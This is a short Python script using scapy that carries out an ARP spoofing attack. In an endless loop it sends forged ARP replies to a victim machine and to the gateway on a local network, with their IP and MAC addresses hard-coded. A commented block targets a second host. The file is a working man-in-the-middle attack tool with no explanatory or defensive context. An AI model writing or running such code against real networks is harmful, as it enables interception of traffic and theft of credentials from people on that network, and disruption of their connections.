from scapy.all import *
import time

def arp_spoofing(victim_ip, victim_mac, other_ip, other_mac):

    pc_mac = get_if_hwaddr(conf.iface)
    
    Ether_packet = Ether(dst=victim_mac, src=pc_mac)
    full_packet = Ether_packet / ARP(op='is-at', psrc = other_ip, pdst = victim_ip, hwsrc = pc_mac, hwdst=victim_mac)
    sendp(full_packet, verbose=False)

    Ether_packet = Ether(dst=other_mac, src=pc_mac)
    full_packet = Ether_packet / ARP(op='is-at', psrc = victim_ip, pdst = other_ip, hwsrc = pc_mac, hwdst=other_mac)
    sendp(full_packet, verbose=False)


if __name__ == '__main__':
    while True:
        arp_spoofing("192.168.1.77", "B8:87:6E:6D:A7:2C", "192.168.1.1", "b0:f1:d8:9:a7:a9")
        time.sleep(1)
        print("/")

# 10.55.192.203

# while True:
#     arp_spoofing("192.168.1.249", "88:66:5A:29:97:7B", "192.168.1.1", "b0:f1:d8:9:a7:a9")
#     time.sleep(10)
